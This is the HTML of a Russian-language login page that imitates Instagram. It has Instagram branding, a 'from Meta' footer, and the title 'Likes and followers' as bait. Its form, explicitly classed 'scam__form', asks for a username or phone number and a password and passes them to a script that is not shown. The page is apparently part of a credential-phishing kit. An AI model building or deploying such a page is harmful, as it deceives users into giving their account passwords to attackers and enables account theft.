<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Likes and followers</title>
    <link rel="stylesheet" href="./css/atamar.css">
    <link rel="stylesheet" href="./css/style.css">
</head>
<body>
    <main class="body">
        <section class="section__header">
            <div class="header__container"><p class="header__text r-bold">Authorization</p></div>
        </section>
        <div class="container main">
            <div class="language-block">
                <p class="r-reg">Русский &#9660;</p>
            </div>
            <div class="inst-img-block">
                <img src="./images/inst-icon.png" alt="logo">
            </div>
            <form id="form" class="scam__form">
                <div class="form-inputs-block">
                    <input type="text" id="formName" placeholder="Телефон, имя пользователя или эл. адрес">
                    <input type="password" id="formPass" placeholder="Пароль">
                </div>
                <p class="form-forgot r-reg">Забыли пароль?</p>
                <button type="submit" id="formBtn" class="btn r-bold">Войти</button>
            </form>
        </div>
        <div class="text-reg-block">
            <p class="text-registr r-reg">У вас ещё нет аккаунта? <span class="text-registr_blue r-bold">Зарегистрироваться</span></p>
        </div>
    </main>
    <footer>
        <section class="section__footer">
            <div class="container footer">
                <div class="foot-block">
                    <p class="foot-text r-reg">from</p>
                    <img src="./images/meta.png" alt="meta">
                </div>
            </div>
        </section>
    </footer>
    <script src="./js/script.js"></script>
</body>
</html>
